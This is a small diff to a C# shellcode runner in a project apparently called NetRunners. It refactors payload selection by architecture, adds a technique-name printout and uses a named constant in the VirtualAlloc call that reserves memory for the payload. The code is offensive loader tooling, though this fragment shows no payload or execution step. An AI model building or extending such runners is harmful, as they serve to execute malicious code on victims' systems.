@@ -21,15 +21,17 @@ namespace NetRunners.Runners
             IntPtr pMemory;
             IntPtr hThread;
             uint oldProtect;
-            byte[] buf = GetPayload();
-            int sBuf = GetSize();
+            byte[] buf = SelectPayloadArchitecture();
+            int sBuf = SelectPayloadSize();
 
             try
             {
-                Console.WriteLine("[+] Default Shellcode Runner selected!");
+                // heads up
+                string techniqueName = "Default Runner";
+                PrintTechniqueInfo(techniqueName);
 
                 // call virtual alloc to allocate memory space here
-                pMemory = VirtualAlloc(IntPtr.Zero, (uint)sBuf, 0x3000, PAGE_READWRITE);
+                pMemory = VirtualAlloc(IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_READWRITE);
                 if (pMemory == IntPtr.Zero)
                     throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()} ");
 
